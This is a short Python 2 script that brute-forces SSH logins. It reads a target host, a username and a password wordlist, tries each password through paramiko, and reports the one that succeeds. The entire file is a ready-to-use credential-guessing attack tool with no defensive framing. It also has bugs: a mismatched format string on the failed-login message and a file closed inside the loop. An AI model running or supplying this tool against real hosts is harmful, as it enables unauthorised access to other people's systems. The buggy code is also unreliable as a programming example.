import paramiko, sys, os, socket

global host, username, line, input_file

line = "\n------------------------------------\n"

try:
    host = raw_input("[*] Enter Target Host Address: ")
    username = raw_input("[*] Enter SSH Username: ")
    input_file = raw_input("[*] Enter SSH Password File: ")

    if os.path.exists(input_file) == False:
        print "\n[*] File Path Does Not Exist"
        sys.exit(4)

except KeyboardInterrupt:
    print "\n\n[*] User Requested An Interrupt"
    sys.exit(3)


def ssh_connect(password, code = 0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(host, port=22, username=username, password=password)
    except paramiko.AuthenticationException:
            #[*] Connection Failed ...
            code = 1
    except socket.error, e:
            #[*] Connection Failed ... Host Down
            code = 2
    ssh.close()
    return code

input_file = open(input_file)

print ''

for i in input_file.readlines():
    password = i.strip("\n")
    try:
        response = ssh_connect(password)
        if response == 0:
            print("%s[*] User: %s [*] Pass Found: %s%s" % (line, username, password, line))
            sys.exit(0)
        elif response == 1:
            print("%s[*] User: %s [*] Pass: %s => Login Incorrect <=" % (username, password))
        elif response == 2:
            print ("[*] Connection Could Not Be Established To Address: %s" % (host))
            sys.exit(2)
    except Exception, e:
        print 0
        pass

    input_file.close()
